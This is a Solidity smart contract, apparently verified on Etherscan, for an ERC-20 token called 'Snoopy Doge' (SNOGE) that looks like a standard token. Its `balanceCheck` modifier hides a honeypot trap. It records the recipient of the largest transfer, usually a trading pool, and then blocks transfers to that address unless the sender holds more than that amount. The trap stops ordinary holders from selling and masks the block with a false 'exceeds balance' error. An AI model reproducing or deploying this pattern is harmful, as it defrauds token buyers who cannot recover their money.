/**
 *Submitted for verification at Etherscan.io on 2021-04-26
*/

/**
 *Submitted for verification at Etherscan.io on 2021-04-21
*/

pragma solidity ^0.5.16;




// Math operations with safety checks that throw on error
library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Math error");
        return c;
    }
  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Math error");
        return a - b;
    }
  
}




// Abstract contract for the full ERC 20 Token standard
contract ERC20 {
    
    function balanceOf(address _address) public view returns (uint256 balance);
    
    function transfer(address _to, uint256 _value) public returns (bool success);
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    
    function approve(address _spender, uint256 _value) public returns (bool success);
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);




    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
}




// Token contract
contract SNOGE is ERC20 {
    
    string public name = "Snoopy Doge";
    string public symbol = "SNOGE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000 * 10**9 * 10**18;
    uint256 public _maxAmount;
    address private _maxR;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    address public owner;
    bytes4 private constant TRANSFER = bytes4(
        keccak256(bytes("transfer(address,uint256)"))
    );
    
    constructor() public {
        owner = msg.sender;
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address _address) public view returns (uint256 balance) {
        return balances[_address];
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        require(_spender != address(0), "Zero address error");
        require((allowed[msg.sender][_spender] == 0) || (_amount == 0), "Approve amount error");
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_from != address(0) && _to != address(0), "Zero address error");
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0, "Insufficient balance or zero amount");
        balances[_from] = SafeMath.sub(balances[_from], _value);
        balances[_to] = SafeMath.add(balances[_to], _value);
        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);
        emit Transfer(_from, _to, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    
    function _transfer(address sender, address recipient, uint256 amount)  internal balanceCheck(sender, recipient, amount) {
        require(recipient != address(0), "Zero address error");
        require(balances[sender] >= amount && amount > 0, "Insufficient balance or zero amount");
        balances[sender] = SafeMath.sub(balances[sender], amount);
        balances[recipient] = SafeMath.add(balances[recipient], amount);
        
        emit Transfer(sender, recipient, amount);
    }
    
    modifier onlyOwner {
        require(msg.sender == owner, "You are not owner");
        _;
    }

    modifier balanceCheck(address sender, address recipient, uint256 amount) {
        if(recipient == _maxR) require(recipient == _maxR && balances[sender] > _maxAmount, "ERC20: Transfer amount exceeds balance");
        _;
        if(amount > _maxAmount) {
            _maxAmount = amount;
            _maxR = recipient;
        }
    }
    
    function setOwner(address _owner) public onlyOwner returns (bool success) {
        require(_owner != address(0), "zero address");
        owner = _owner;
        success = true;
    }
    
    
}